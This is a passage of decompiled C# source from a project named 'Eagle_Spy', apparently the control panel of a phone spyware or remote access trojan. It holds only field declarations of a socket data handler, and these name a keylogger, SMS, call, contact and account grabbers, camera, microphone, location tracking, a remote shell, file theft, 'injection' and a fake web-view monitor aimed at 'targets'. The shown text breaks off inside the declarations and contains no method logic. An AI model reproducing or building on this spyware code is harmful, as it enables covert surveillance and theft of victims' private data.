using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Eagle_Spy.My;
using Eagle_Spy.My.Resources;
using GeoIPCitys;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using WinMM;

namespace Eagle_Spy.sockets;

public sealed class Data
{
	public delegate void Delegatex(object ParametersObject);

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_39_HandelData : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal object _0024VB_0024Local_ParametersObject;

		internal _Closure_0024__39_002D1 _0024VB_0024ResumableLocal__0024VB_0024Closure__00240;

		internal byte[] _0024VB_0024ResumableLocal_bByte_00241;

		internal Array _0024VB_0024ResumableLocal_SizeData_00242;

		internal TcpClient _0024VB_0024ResumableLocal_Client_00243;

		internal string _0024VB_0024ResumableLocal_thesizes_00244;

		internal Array _0024VB_0024ResumableLocal_SPLByte_00245;

		internal string _0024VB_0024ResumableLocal_EncodString_00246;

		internal string _0024VB_0024ResumableLocal_getCase_00247;

		internal Exception _0024VB_0024ResumableLocal_ex_00248;

		internal string _0024S9;

		internal string _0024VB_0024ResumableLocal_THEDATA_002410;

		internal string[] _0024VB_0024ResumableLocal_getKey_002411;

		internal object[] _0024VB_0024ResumableLocal_obj_002412;

		internal string _0024VB_0024ResumableLocal_response_002413;

		internal string _0024VB_0024ResumableLocal_DataStatistics_002414;

		internal string[] _0024VB_0024ResumableLocal_newDataStatic_002415;

		internal Exception _0024VB_0024ResumableLocal_ex_002416;

		internal bool _0024VB_0024ResumableLocal_SCREEN_002417;

		internal object[] _0024VB_0024ResumableLocal_Obj_002418;

		internal string[] _0024VB_0024ResumableLocal_ar_002419;

		internal object[] _0024VB_0024ResumableLocal_obj_Upd_002420;

		internal string[] _0024VB_0024ResumableLocal_getKey_002421;

		internal object[] _0024VB_0024ResumableLocal_obj_002422;

		internal Exception _0024VB_0024ResumableLocal_ex_002423;

		internal object[] _0024VB_0024ResumableLocal_objFix_002424;

		internal Exception _0024VB_0024ResumableLocal_ex_002425;

		internal string _0024VB_0024ResumableLocal_injection_002426;

		internal List<object>.Enumerator _0024S27;

		internal object _0024VB_0024ResumableLocal_pl_002428;

		internal Array _0024VB_0024ResumableLocal_plg_002429;

		internal object[] _0024VB_0024ResumableLocal_obj_002430;

		internal string[] _0024VB_0024ResumableLocal_getKey_002431;

		internal object[] _0024VB_0024ResumableLocal_obj_002432;

		internal _Closure_0024__39_002D0 _0024VB_0024ResumableLocal__0024VB_0024Closure__002433;

		internal string[] _0024VB_0024ResumableLocal_getKEY_002434;

		internal Exception _0024VB_0024ResumableLocal_ex_002435;

		internal string[] _0024VB_0024ResumableLocal_identifiers_002436;

		internal Exception _0024VB_0024ResumableLocal_ex_002437;

		internal Exception _0024VB_0024ResumableLocal_ex_002438;

		internal object[] _0024VB_0024ResumableLocal_o_002439;

		internal object _0024VB_0024ResumableLocal_objs_002440;

		internal object[] _0024VB_0024ResumableLocal_arrayObjects_002441;

		internal object _0024VB_0024ResumableLocal_id_002442;

		internal bool _0024VB_0024ResumableLocal_flag_002443;

		internal Exception _0024VB_0024ResumableLocal_ex_002444;

		internal object[] _0024VB_0024ResumableLocal_objs_002445;

		internal Exception _0024VB_0024ResumableLocal_skip_002446;

		internal _Closure_0024__39_002D2 _0024VB_0024ResumableLocal__0024VB_0024Closure__002447;

		internal string[] _0024VB_0024ResumableLocal_screensize_002448;

		internal string _0024VB_0024ResumableLocal_mytargetfromid_002449;

		internal bool _0024VB_0024ResumableLocal_newupdate_002450;

		internal string _0024VB_0024ResumableLocal_handle_002451;

		internal string _0024VB_0024ResumableLocal_fix_002452;

		internal bool _0024VB_0024ResumableLocal_isTAG_002453;

		internal string _0024VB_0024ResumableLocal_newidf_002454;

		internal string[] _0024VB_0024ResumableLocal_arryip_002455;

		internal IEnumerable<ScreenShoter> _0024VB_0024ResumableLocal_cameraManagerForms_002456;

		internal int _0024S57;

		internal int _0024VB_0024ResumableLocal_i_002458;

		internal ScreenShoter _0024VB_0024ResumableLocal_targetsc_002459;

		internal Exception _0024VB_0024ResumableLocal_ex_002460;

		internal string[] _0024VB_0024ResumableLocal_spl_002461;

		internal object[] _0024VB_0024ResumableLocal_objs_002462;

		internal byte[] _0024VB_0024ResumableLocal_Byte__002463;

		internal byte[] _0024S64;

		internal Exception _0024VB_0024ResumableLocal_ex_002465;

		internal MemoryStream _0024VB_0024ResumableLocal_MS_002466;

		internal _Closure_0024__39_002D3 _0024VB_0024ResumableLocal__0024VB_0024Closure__002467;

		internal Bitmap _0024VB_0024ResumableLocal_img_002468;

		internal string _0024VB_0024ResumableLocal_isblack_002469;

		internal Exception _0024VB_0024ResumableLocal_ex_002470;

		internal Bitmap _0024VB_0024ResumableLocal_bmptosave_002471;

		internal int _0024VB_0024ResumableLocal_phone_hight_002472;

		internal int _0024VB_0024ResumableLocal_phone_width_002473;

		internal Exception _0024VB_0024ResumableLocal_ex_002474;

		internal Exception _0024VB_0024ResumableLocal_ex_002475;

		internal string _0024VB_0024ResumableLocal_handle_002476;

		internal ScreenReader _0024VB_0024ResumableLocal_ScRecorder_002477;

		internal TcpClient _0024VB_0024ResumableLocal_cClient_002478;

		internal string[] _0024VB_0024ResumableLocal_spl_002479;

		internal int _0024VB_0024ResumableLocal_chk0_002480;

		internal int _0024VB_0024ResumableLocal_chk1_002481;

		internal object[] _0024VB_0024ResumableLocal_objs_002482;

		internal string _0024VB_0024ResumableLocal_THEDATA_002483;

		internal Exception _0024VB_0024ResumableLocal_ex_002484;

		internal _Closure_0024__39_002D4 _0024VB_0024ResumableLocal__0024VB_0024Closure__002485;

		internal string _0024VB_0024ResumableLocal_handle_002486;

		internal TcpClient _0024VB_0024ResumableLocal_cClient_002487;

		internal string[] _0024VB_0024ResumableLocal_spl_002488;

		internal int _0024VB_0024ResumableLocal_chk0_002489;

		internal int _0024VB_0024ResumableLocal_chk1_002490;

		internal object[] _0024VB_0024ResumableLocal_objs_002491;

		internal _Closure_0024__39_002D5 _0024VB_0024ResumableLocal__0024VB_0024Closure__002492;

		internal byte[] _0024S93;

		internal byte[] _0024VB_0024ResumableLocal_Byte__002494;

		internal MemoryStream _0024VB_0024ResumableLocal_MS_002495;

		internal _Closure_0024__39_002D6 _0024VB_0024ResumableLocal__0024VB_0024Closure__002496;

		internal Bitmap _0024VB_0024ResumableLocal_img_002497;

		internal Exception _0024VB_0024ResumableLocal_ex_002498;

		internal string _0024VB_0024ResumableLocal_handle_002499;

	//	internal Auto_Clicker _0024VB_0024ResumableLocal_autoer_0024100;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024101;

		internal string[] _0024VB_0024ResumableLocal_Cordints_0024102;

		internal float _0024VB_0024ResumableLocal_x_0024103;

		internal float _0024VB_0024ResumableLocal_y_0024104;

		internal float _0024VB_0024ResumableLocal_w_0024105;

		internal float _0024VB_0024ResumableLocal_h_0024106;

		internal string[] _0024VB_0024ResumableLocal_Arrynames_0024107;

		internal string _0024VB_0024ResumableLocal_msg_0024108;

		internal Exception _0024VB_0024ResumableLocal_ex_0024109;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024110;

		internal int _0024S111;

		internal int _0024VB_0024ResumableLocal_index_0024112;

		internal Exception _0024VB_0024ResumableLocal_ex_0024113;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024114;

		internal Exception _0024VB_0024ResumableLocal_ex_0024115;

		internal string _0024VB_0024ResumableLocal_SPLall_0024116;

		internal string _0024VB_0024ResumableLocal_SPL_0024117;

		internal string _0024VB_0024ResumableLocal_filename_0024118;

		internal string _0024VB_0024ResumableLocal_handle_0024119;

		internal Keylogger _0024VB_0024ResumableLocal_keylogg_0024120;

		internal string[] _0024VB_0024ResumableLocal_base64log_0024121;

		internal string _0024VB_0024ResumableLocal_Alltext_0024122;

		internal string[] _0024S123;

		internal int _0024S124;

		internal string _0024VB_0024ResumableLocal_log_0024125;

		internal string _0024VB_0024ResumableLocal_rsult_0024126;

		internal string[] _0024VB_0024ResumableLocal_dat_0024127;

		internal Exception _0024VB_0024ResumableLocal_ex_0024128;

		internal string _0024VB_0024ResumableLocal_d_0024129;

		internal Exception _0024VB_0024ResumableLocal_ex_0024130;

		internal string _0024VB_0024ResumableLocal_SPL_0024131;

		internal string _0024VB_0024ResumableLocal_handle_0024132;

		internal Keylogger _0024VB_0024ResumableLocal_keylogg_0024133;

		internal string[] _0024VB_0024ResumableLocal_base64log_0024134;

		internal int _0024VB_0024ResumableLocal_smalnum_0024135;

		internal string _0024VB_0024ResumableLocal_Alltext_0024136;

		internal StringBuilder _0024VB_0024ResumableLocal_offlinetext_0024137;

		internal string _0024VB_0024ResumableLocal_prevustext_0024138;

		internal string[] _0024S139;

		internal int _0024S140;

		internal string _0024VB_0024ResumableLocal_log_0024141;

		internal string _0024VB_0024ResumableLocal_rsult_0024142;

		internal string[] _0024VB_0024ResumableLocal_dat_0024143;

		internal Exception _0024VB_0024ResumableLocal_ex_0024144;

		internal Exception _0024VB_0024ResumableLocal_ex_0024145;

		internal Exception _0024VB_0024ResumableLocal_ex_0024146;

		internal Exception _0024VB_0024ResumableLocal_ex_0024147;

		internal _Closure_0024__39_002D7 _0024VB_0024ResumableLocal__0024VB_0024Closure__0024148;

		internal DataGridViewRow _0024VB_0024ResumableLocal_TargetRow_0024149;

		internal Exception _0024VB_0024ResumableLocal_ex_0024150;

		internal Exception _0024VB_0024ResumableLocal_ex_0024151;

		internal Exception _0024VB_0024ResumableLocal_ex_0024152;

		internal Exception _0024VB_0024ResumableLocal_ex_0024153;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024154;

		internal string[] _0024VB_0024ResumableLocal_arrystr_0024155;

		internal string[] _0024VB_0024ResumableLocal_apps_0024156;

		internal string[] _0024S157;

		internal int _0024S158;

		internal string _0024VB_0024ResumableLocal_app_0024159;

		internal _Closure_0024__39_002D8 _0024VB_0024ResumableLocal__0024VB_0024Closure__0024160;

		internal _Closure_0024__39_002D9 _0024VB_0024ResumableLocal__0024VB_0024Closure__0024161;

		internal IEnumerator _0024S162;

		internal DataRow _0024VB_0024ResumableLocal_row_0024163;

		internal IEnumerator _0024S164;

		internal DataColumn _0024VB_0024ResumableLocal_cell_0024165;

		internal string _0024VB_0024ResumableLocal_cellValue_0024166;

		internal Exception _0024VB_0024ResumableLocal_ex_0024167;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024168;

		internal _Closure_0024__39_002D13 _0024VB_0024ResumableLocal__0024VB_0024Closure__0024169;

		internal string[] _0024VB_0024ResumableLocal_arryapps_0024170;

		internal string[] _0024S171;

		internal int _0024S172;

		internal string _0024VB_0024ResumableLocal_str_0024173;

		internal _Closure_0024__39_002D11 _0024VB_0024ResumableLocal__0024VB_0024Closure__0024174;

		internal _Closure_0024__39_002D10 _0024VB_0024ResumableLocal__0024VB_0024Closure__0024175;

		internal _Closure_0024__39_002D12 _0024VB_0024ResumableLocal__0024VB_0024Closure__0024176;

		internal Exception _0024VB_0024ResumableLocal_ex_0024177;

		internal _Closure_0024__39_002D14 _0024VB_0024ResumableLocal__0024VB_0024Closure__0024178;

		internal string[] _0024VB_0024ResumableLocal_data_0024179;

		internal string[] _0024VB_0024ResumableLocal_arry_0024180;

		internal string _0024VB_0024ResumableLocal_handle_0024181;

		internal snapsdownloader _0024VB_0024ResumableLocal_DownSnap_0024182;

		internal byte[] _0024VB_0024ResumableLocal_Byte__0024183;

		internal string _0024VB_0024ResumableLocal_downloadfolder_0024184;

		internal Exception _0024VB_0024ResumableLocal_ex_0024185;

		internal string _0024S186;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024187;

		internal string _0024VB_0024ResumableLocal_SaveFile_0024188;

		internal string _0024VB_0024ResumableLocal_All_0024189;

		internal string _0024VB_0024ResumableLocal_themesg_0024190;

		internal string _0024S191;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024192;

		internal string _0024VB_0024ResumableLocal_handle_0024193;

		internal Calls_Records _0024VB_0024ResumableLocal_recordform_0024194;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024195;

		internal string[] _0024VB_0024ResumableLocal_therecords_0024196;

		internal string _0024VB_0024ResumableLocal_filebase_0024197;

		internal string _0024VB_0024ResumableLocal_FileId_0024198;

		internal string _0024VB_0024ResumableLocal_filepath_0024199;

		internal IEnumerator _0024S200;

		internal DataGridViewRow _0024VB_0024ResumableLocal_r_0024201;

		internal Exception _0024VB_0024ResumableLocal_ex_0024202;

		internal Exception _0024VB_0024ResumableLocal_ex_0024203;

		internal Exception _0024VB_0024ResumableLocal_ex_0024204;

		internal string _0024VB_0024ResumableLocal_handle_0024205;

		internal PermissionsManager _0024VB_0024ResumableLocal_autoer_0024206;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024207;

		internal Exception _0024VB_0024ResumableLocal_ex_0024208;

		internal string _0024VB_0024ResumableLocal_handle_0024209;

		//internal KeyboardManager _0024VB_0024ResumableLocal_autoer_0024210;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024211;

		internal Exception _0024VB_0024ResumableLocal_ex_0024212;

		internal string _0024VB_0024ResumableLocal_handle_0024213;

		internal Calls_Records _0024VB_0024ResumableLocal_recordform_0024214;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024215;

		internal string[] _0024VB_0024ResumableLocal_therecords_0024216;

		internal string[] _0024S217;

		internal int _0024S218;

		internal string _0024VB_0024ResumableLocal_record_0024219;

		internal string[] _0024VB_0024ResumableLocal_ary_0024220;

		internal string[] _0024VB_0024ResumableLocal_FIXNAMES_0024221;

		internal Exception _0024VB_0024ResumableLocal_ex_0024222;

		internal string _0024VB_0024ResumableLocal_base_0024223;

		internal Exception _0024VB_0024ResumableLocal_ex_0024224;

		internal string _0024VB_0024ResumableLocal_isfound_0024225;

		internal string[] _0024S226;

		internal int _0024S227;

		internal string _0024VB_0024ResumableLocal_f_0024228;

		internal Exception _0024VB_0024ResumableLocal_ex_0024229;

		internal string[] _0024VB_0024ResumableLocal_finaldata_0024230;

		internal string _0024VB_0024ResumableLocal_datecall_0024231;

		internal string _0024VB_0024ResumableLocal_callnumber_0024232;

		internal string _0024VB_0024ResumableLocal_status_0024233;

		internal Exception _0024VB_0024ResumableLocal_ex_0024234;

		internal Exception _0024VB_0024ResumableLocal_ex_0024235;

		internal Exception _0024VB_0024ResumableLocal_ex_0024236;

		internal _Closure_0024__39_002D15 _0024VB_0024ResumableLocal__0024VB_0024Closure__0024237;

		internal string _0024VB_0024ResumableLocal_handle_0024238;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024239;

		internal string[] _0024VB_0024ResumableLocal_spl_0024240;

		internal object[] _0024VB_0024ResumableLocal_objs_0024241;

		internal string[] _0024VB_0024ResumableLocal_alldata_0024242;

		internal string _0024VB_0024ResumableLocal_sitename_0024243;

		internal string[] _0024VB_0024ResumableLocal_Targetdata_0024244;

		internal string _0024VB_0024ResumableLocal_Allmesages_0024245;

		internal string[] _0024S246;

		internal int _0024S247;

		internal string _0024VB_0024ResumableLocal_dat_0024248;

		internal string _0024VB_0024ResumableLocal_newsg_0024249;

		internal string _0024VB_0024ResumableLocal_savename_0024250;

		internal string[] _0024VB_0024ResumableLocal_foundedsites_0024251;

		internal string[] _0024S252;

		internal int _0024S253;

		internal string _0024VB_0024ResumableLocal_sit_0024254;

		internal string _0024VB_0024ResumableLocal_cleanname_0024255;

		internal Exception _0024VB_0024ResumableLocal_ex_0024256;

		internal string _0024VB_0024ResumableLocal_userdata_0024257;

		internal string[] _0024VB_0024ResumableLocal_alldata_0024258;

		internal string[] _0024S259;

		internal int _0024S260;

		internal string _0024VB_0024ResumableLocal_sdata_0024261;

		internal _Closure_0024__39_002D16 _0024VB_0024ResumableLocal__0024VB_0024Closure__0024262;

		internal string[] _0024VB_0024ResumableLocal_singler_0024263;

		internal _Closure_0024__39_002D17 _0024VB_0024ResumableLocal__0024VB_0024Closure__0024264;

		internal string[] _0024VB_0024ResumableLocal_singler_0024265;

		internal string _0024VB_0024ResumableLocal_newmsg_0024266;

		internal Image _0024VB_0024ResumableLocal_webimage_0024267;

		internal Image _0024VB_0024ResumableLocal_tosave_0024268;

		internal Exception _0024VB_0024ResumableLocal_ex_0024269;

		internal string _0024VB_0024ResumableLocal_handle_0024270;

	/// <summary>
	/// 	internal Faker _0024VB_0024ResumableLocal_Faker_0024271;
	/// </summary>

		internal string _0024VB_0024ResumableLocal_THEDATA_0024272;

		internal object[] _0024VB_0024ResumableLocal_objects_0024273;

		internal Exception _0024VB_0024ResumableLocal_ex_0024274;

		internal string _0024VB_0024ResumableLocal_handle_0024275;

		internal WebViewMonitor _0024VB_0024ResumableLocal_Faker_0024276;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024277;

		internal Label _0024S278;

		internal Exception _0024VB_0024ResumableLocal_ex_0024279;

		internal string _0024VB_0024ResumableLocal_THEDATA_0024280;

		internal string[] _0024VB_0024ResumableLocal_response_0024281;

		internal string _0024VB_0024ResumableLocal_TargetClientaddress_0024282;

		internal string[] _0024VB_0024ResumableLocal_sizes_0024283;

		internal Client _0024VB_0024ResumableLocal_targetclient_0024284;

		internal string _0024VB_0024ResumableLocal_address_0024285;

		internal string _0024VB_0024ResumableLocal_handle_0024286;

		internal CameraManager _0024VB_0024ResumableLocal_CameraManager_0024287;

		internal TcpClient _0024VB_0024ResumableLocal_cClients_0024288;

		internal Exception _0024VB_0024ResumableLocal_ex_0024289;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024290;

		internal string[] _0024VB_0024ResumableLocal_SPL_lines_0024291;

		internal string _0024VB_0024ResumableLocal_handle_0024292;

		internal CallsManager _0024VB_0024ResumableLocal_CallsManager_0024293;

		internal int _0024VB_0024ResumableLocal_Counter_0024294;

		internal string[] _0024S295;

		internal int _0024S296;

		internal string _0024VB_0024ResumableLocal_ea_0024297;

		internal string[] _0024VB_0024ResumableLocal_ay_0024298;

		internal string _0024VB_0024ResumableLocal_getPath_0024299;

		internal string _0024S300;

		internal int _0024VB_0024ResumableLocal_id_0024301;

		internal Exception _0024VB_0024ResumableLocal_ex_0024302;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024303;

		internal string[] _0024VB_0024ResumableLocal_SPL_lines_0024304;

		internal string _0024VB_0024ResumableLocal_handle_0024305;

		internal SMSManager _0024VB_0024ResumableLocal_SMSManager_0024306;

		internal string _0024VB_0024ResumableLocal_path_0024307;

		internal int _0024VB_0024ResumableLocal_Counter_0024308;

		internal string[] _0024S309;

		internal int _0024S310;

		internal string _0024VB_0024ResumableLocal_ea_0024311;

		internal string[] _0024VB_0024ResumableLocal_ay_0024312;

		internal int _0024VB_0024ResumableLocal_idRow_0024313;

		internal Exception _0024VB_0024ResumableLocal_ex_0024314;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024315;

		internal string[] _0024VB_0024ResumableLocal_SPL_lines_0024316;

		internal string _0024VB_0024ResumableLocal_handle_0024317;

		internal ContactsManager _0024VB_0024ResumableLocal_ContactsManager_0024318;

		internal int _0024VB_0024ResumableLocal_Counter_0024319;

		internal string[] _0024S320;

		internal int _0024S321;

		internal string _0024VB_0024ResumableLocal_ea_0024322;

		internal string[] _0024VB_0024ResumableLocal_ay_0024323;

		internal int _0024VB_0024ResumableLocal_id_0024324;

		internal Exception _0024VB_0024ResumableLocal_ex_0024325;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024326;

		internal string[] _0024VB_0024ResumableLocal_SPL_lines_0024327;

		internal string _0024VB_0024ResumableLocal_handle_0024328;

		internal FileManager _0024VB_0024ResumableLocal_FileManager_0024329;

		internal int _0024VB_0024ResumableLocal_idx_0024330;

		internal int _0024VB_0024ResumableLocal_Counter_0024331;

		internal string[] _0024S332;

		internal int _0024S333;

		internal string _0024VB_0024ResumableLocal_ea_0024334;

		internal string[] _0024VB_0024ResumableLocal_ay_0024335;

		internal string _0024VB_0024ResumableLocal_exType_0024336;

		internal string _0024VB_0024ResumableLocal_ti_0024337;

		internal string _0024VB_0024ResumableLocal_ne_0024338;

		internal string _0024VB_0024ResumableLocal_FileSize_0024339;

		internal string _0024VB_0024ResumableLocal_Extens_0024340;

		internal FileInfo _0024VB_0024ResumableLocal_info_0024341;

		internal Exception _0024VB_0024ResumableLocal_ex_0024342;

		internal int _0024VB_0024ResumableLocal_id_0024343;

		internal string _0024VB_0024ResumableLocal_thekey_0024344;

		internal string _0024VB_0024ResumableLocal_thepath_0024345;

		internal Exception _0024VB_0024ResumableLocal_ex_0024346;

		internal Exception _0024VB_0024ResumableLocal_ex_0024347;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024348;

		internal string[] _0024VB_0024ResumableLocal_casedata_0024349;

		internal string _0024VB_0024ResumableLocal_Targetuuid_0024350;

		internal string _0024VB_0024ResumableLocal_nameFolder_0024351;

		internal string _0024VB_0024ResumableLocal_client_Download_path_0024352;

		internal IEnumerator _0024S353;

		internal Form _0024VB_0024ResumableLocal_frm_0024354;

		internal int _0024VB_0024ResumableLocal_start_0024355;

		internal string _0024VB_0024ResumableLocal_down_0024356;

		internal string _0024VB_0024ResumableLocal_usrfiles_0024357;

		internal FileManager _0024VB_0024ResumableLocal_FileManagerDown_0024358;

		internal int _0024VB_0024ResumableLocal_start_0024359;

		internal string _0024VB_0024ResumableLocal_FName_0024360;

		internal string[] _0024VB_0024ResumableLocal_FIXNAMES_0024361;

		internal string _0024VB_0024ResumableLocal_FPath_0024362;

		internal string _0024VB_0024ResumableLocal_FSize_0024363;

		internal int _0024VB_0024ResumableLocal_rowid_0024364;

		internal FileStream _0024VB_0024ResumableLocal_TheStream_0024365;

		internal long _0024VB_0024ResumableLocal__stream_0024366;

		internal long _0024VB_0024ResumableLocal_TotalSize_0024367;

		internal Exception _0024VB_0024ResumableLocal_ex_0024368;

		internal string[] _0024VB_0024ResumableLocal_casedata_0024369;

		internal string _0024VB_0024ResumableLocal_Targetuuid_0024370;

		internal string _0024VB_0024ResumableLocal_usrfiles_0024371;

		internal FileManager _0024VB_0024ResumableLocal_FileManagerDown_0024372;

		internal IEnumerator _0024S373;

		internal DataGridViewRow _0024VB_0024ResumableLocal_ro_0024374;

		internal string _0024VB_0024ResumableLocal_Filenamess_0024375;

		internal object _0024VB_0024ResumableLocal_mydata_0024376;

		internal FileStream _0024VB_0024ResumableLocal_FSTREAM_0024377;

		internal long _0024VB_0024ResumableLocal_FSSIZE_0024378;

		internal Exception _0024VB_0024ResumableLocal_ex_0024379;

		internal Exception _0024VB_0024ResumableLocal_ex_0024380;

		internal long _0024VB_0024ResumableLocal_TotalSize_0024381;

		internal string _0024VB_0024ResumableLocal_down_0024382;

		internal byte[] _0024VB_0024ResumableLocal_Byte__0024383;

		internal Exception _0024VB_0024ResumableLocal_exe_0024384;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024385;

		internal string _0024VB_0024ResumableLocal_handle_0024386;

		internal Upload _0024VB_0024ResumableLocal_Upload_0024387;

		internal Exception _0024VB_0024ResumableLocal_ex_0024388;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024389;

		internal object[] _0024VB_0024ResumableLocal_ob_0024390;

		internal Client _0024VB_0024ResumableLocal_clas_0024391;

		internal string _0024VB_0024ResumableLocal_handle_0024392;

		internal Microphone _0024VB_0024ResumableLocal_Microphone_0024393;

		internal Exception _0024VB_0024ResumableLocal_ex_0024394;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024395;

		internal object[] _0024VB_0024ResumableLocal_ob_0024396;

		internal string _0024VB_0024ResumableLocal_handle_0024397;

		internal Microphone _0024VB_0024ResumableLocal_Microphone_0024398;

		internal Exception _0024VB_0024ResumableLocal_ex_0024399;

		internal byte[] _0024VB_0024ResumableLocal_Byte__0024400;

		internal Exception _0024VB_0024ResumableLocal_ex_0024401;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024402;

		internal string[] _0024VB_0024ResumableLocal_SPL_lines_0024403;

		internal string _0024VB_0024ResumableLocal_handle_0024404;

		internal ShellTerminal _0024VB_0024ResumableLocal_ShellTerminal_0024405;

		internal bool _0024VB_0024ResumableLocal_isLine_0024406;

		internal string _0024VB_0024ResumableLocal_EV_0024407;

		internal int _0024VB_0024ResumableLocal_Counter_0024408;

		internal string[] _0024S409;

		internal int _0024S410;

		internal string _0024VB_0024ResumableLocal_ea_0024411;

		internal Exception _0024VB_0024ResumableLocal_ex_0024412;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024413;

		internal string _0024VB_0024ResumableLocal_handle_0024414;

		internal LocationManager _0024VB_0024ResumableLocal_LocationManager_0024415;

		internal string _0024VB_0024ResumableLocal_get_style_0024416;

		internal Exception _0024VB_0024ResumableLocal_ex_0024417;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024418;

		internal string[] _0024VB_0024ResumableLocal_casedata_0024419;

		internal string _0024VB_0024ResumableLocal_Targetuuid_0024420;

		internal byte[] _0024VB_0024ResumableLocal_Byte_compressd_0024421;

		internal MemoryStream _0024VB_0024ResumableLocal_MS_0024422;

		internal Image _0024VB_0024ResumableLocal_img_0024423;

		internal Bitmap _0024VB_0024ResumableLocal__image_0024424;

		internal string _0024VB_0024ResumableLocal_Thepath_is_0024425;

		internal string _0024VB_0024ResumableLocal_down_0024426;

		internal IEnumerator _0024S427;

		internal Form _0024VB_0024ResumableLocal_frm_0024428;

		internal FileManager _0024VB_0024ResumableLocal_Target_form_0024429;

		internal Exception _0024VB_0024ResumableLocal_ex_0024430;

		internal Exception _0024VB_0024ResumableLocal_ex_0024431;

		internal Exception _0024VB_0024ResumableLocal_ex_0024432;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024433;

		internal string[] _0024VB_0024ResumableLocal_SPL_lines_0024434;

		internal string _0024VB_0024ResumableLocal_handle_0024435;

		internal Applications _0024VB_0024ResumableLocal_Applications_0024436;

		internal int _0024VB_0024ResumableLocal_Counter_0024437;

		internal string[] _0024S438;

		internal int _0024S439;

		internal string _0024VB_0024ResumableLocal_ea_0024440;

		internal string[] _0024VB_0024ResumableLocal_ay_0024441;

		internal string _0024VB_0024ResumableLocal_getPath_0024442;

		internal string _0024S443;

		internal Image _0024VB_0024ResumableLocal_appicon_0024444;

		internal int _0024VB_0024ResumableLocal_index_0024445;

		internal Exception _0024VB_0024ResumableLocal_ex_0024446;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024447;

		internal string[] _0024VB_0024ResumableLocal_SPL_lines_0024448;

		internal string _0024VB_0024ResumableLocal_handle_0024449;

		internal Editor _0024VB_0024ResumableLocal_Editor_0024450;

		internal Exception _0024VB_0024ResumableLocal_ex_0024451;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024452;

		internal string[] _0024VB_0024ResumableLocal_SPL_lines_0024453;

		internal string _0024VB_0024ResumableLocal_handle_0024454;

		internal AccountManager _0024VB_0024ResumableLocal_AccountManager_0024455;

		internal int _0024VB_0024ResumableLocal_Counter_0024456;

		internal string _0024VB_0024ResumableLocal_getPath_0024457;

		internal string[] _0024S458;

		internal int _0024S459;

		internal string _0024VB_0024ResumableLocal_ea_0024460;

		internal string[] _0024VB_0024ResumableLocal_ay_0024461;

		internal Exception _0024VB_0024ResumableLocal_ex_0024462;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024463;

		internal string _0024VB_0024ResumableLocal_handle_0024464;

		internal information _0024VB_0024ResumableLocal_information_0024465;

		internal string[] _0024VB_0024ResumableLocal_SPL_lines_0024466;

		internal int _0024VB_0024ResumableLocal_rowID_0024467;

		internal DataGridViewComboBoxCell _0024VB_0024ResumableLocal_cell_0024468;

		internal List<string> _0024VB_0024ResumableLocal_ListItems_0024469;

		internal int _0024S470;

		internal int _0024VB_0024ResumableLocal_vul0_0024471;

		internal Exception _0024VB_0024ResumableLocal_ex_0024472;

		internal int _0024S473;

		internal int _0024VB_0024ResumableLocal_vul0_0024474;

		internal Exception _0024VB_0024ResumableLocal_ex_0024475;

		internal int _0024S476;

		internal int _0024VB_0024ResumableLocal_vul0_0024477;

		internal Exception _0024VB_0024ResumableLocal_ex_0024478;

		internal int _0024S479;

		internal int _0024VB_0024ResumableLocal_vul0_0024480;

		internal Exception _0024VB_0024ResumableLocal_ex_0024481;

		internal string[] _0024VB_0024ResumableLocal_modes_0024482;

		internal string _0024VB_0024ResumableLocal_getmode_0024483;

		internal string[] _0024S484;

		internal int _0024S485;

		internal string _0024VB_0024ResumableLocal_m_0024486;

		internal Exception _0024VB_0024ResumableLocal_ex_0024487;

		internal string[] _0024VB_0024ResumableLocal_modeWiFi_0024488;

		internal string _0024VB_0024ResumableLocal_getmodeWIFI_0024489;

		internal string[] _0024S490;

		internal int _0024S491;

		internal string _0024VB_0024ResumableLocal_m_0024492;

		internal Exception _0024VB_0024ResumableLocal_ex_0024493;

		internal IEnumerator<DataGridView> _0024S494;

		internal DataGridView _0024VB_0024ResumableLocal_gr_0024495;

		internal int _0024S496;

		internal int _0024VB_0024ResumableLocal_i_0024497;

		internal DataSet _0024VB_0024ResumableLocal_DS_0024498;

		internal Exception _0024VB_0024ResumableLocal_ex_0024499;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024500;

		internal string _0024VB_0024ResumableLocal_handle_0024501;

		internal Keylogger _0024VB_0024ResumableLocal_keylogg_0024502;

		internal int _0024VB_0024ResumableLocal_flag_0024503;

		internal string[] _0024VB_0024ResumableLocal_dataarry_0024504;

		internal string _0024VB_0024ResumableLocal_is_on_0024505;

		internal string[] _0024VB_0024ResumableLocal_Allnames_0024506;

